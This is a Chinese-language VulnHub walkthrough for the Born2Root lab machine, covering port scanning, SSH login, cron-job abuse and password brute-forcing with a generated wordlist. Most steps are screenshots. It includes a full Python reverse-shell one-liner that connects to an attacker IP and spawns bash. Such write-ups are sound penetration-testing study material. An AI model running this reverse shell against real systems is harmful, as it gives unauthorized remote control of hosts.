+++
title = '0x046 Born2Root'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



还是向virtualbox妥协了，这次这个问题出现在导入的地方，不是很好解决

# 端口扫描

![](/vulnhub_img/WEBRESOURCE5df578715597c3b49f4243d472dcbbc3image.png)

![](/vulnhub_img/WEBRESOURCEc09a104349dea9c2b05f1e7c2aa9cc16image.png)

![](/vulnhub_img/WEBRESOURCE85c695b652a1e26fe7e61944e338dbe5image.png)

# 渗透

![](/vulnhub_img/WEBRESOURCEf4c5bbbe1a9792b52962a819a7b4cc04image.png)

![](/vulnhub_img/WEBRESOURCE0ed3c7892f2075a49877697a30ee67edimage.png)

发现有效信息：

![](/vulnhub_img/WEBRESOURCE791506b014227d0912174c412d54b9bbimage.png)

![](/vulnhub_img/WEBRESOURCEae0a0635ac2108b46d4ef9863d41e88dimage.png)

但是不知道用户名，只能把首页上的用户名都试试了：

出现一个提示不支持的签名，这个之前遇到过，需要改一下配置文件：

![](/vulnhub_img/WEBRESOURCEdf3314cbc19624c5b2a130d6a462eae8image.png)

好像登录上去了：

![](/vulnhub_img/WEBRESOURCE1b65f822c742c7e7f7868a350631fab3image.png)

# 提权

这次提权有点意思，很多命令被禁用了，只手动挨个找，总于在查找计划任务时找到线索：

![](/vulnhub_img/WEBRESOURCEac6037d08b857388dd6d8efbd7ed288aimage.png)

先提权到jimmy用户吧：

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.104",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

![](/vulnhub_img/WEBRESOURCEe212692feb11cec236b7b3330307807bimage.png)

发现SUID权限程序：

![](/vulnhub_img/WEBRESOURCE94e264ca953699e363b42570e8725b55image.png)

但是使用了绝对路径，相关文件没有权限：

![](/vulnhub_img/WEBRESOURCEb2f5d8b89510e579bc0e9344a36bd0faimage.png)

后面无奈看了WP，结果还是爆破，当初直接爆破会不会更好呢，不同的是，这次cewl的密码本不太够了。实测john生成的不太好用，规则太死了：

需要生成特定的社工字典：

[https://www.bugku.com/mima/](https://www.bugku.com/mima/)

![](/vulnhub_img/WEBRESOURCEfcff4143ec5542e6d7d585d15b533b43image.png)

然后爆破成功：

![](/vulnhub_img/WEBRESOURCEc7c9bf37e31fa4bd34ce742a8c2776c1image.png)

这也是root密码：

![](/vulnhub_img/WEBRESOURCE94a07ea7c2aea512e552e831322422e5image.png)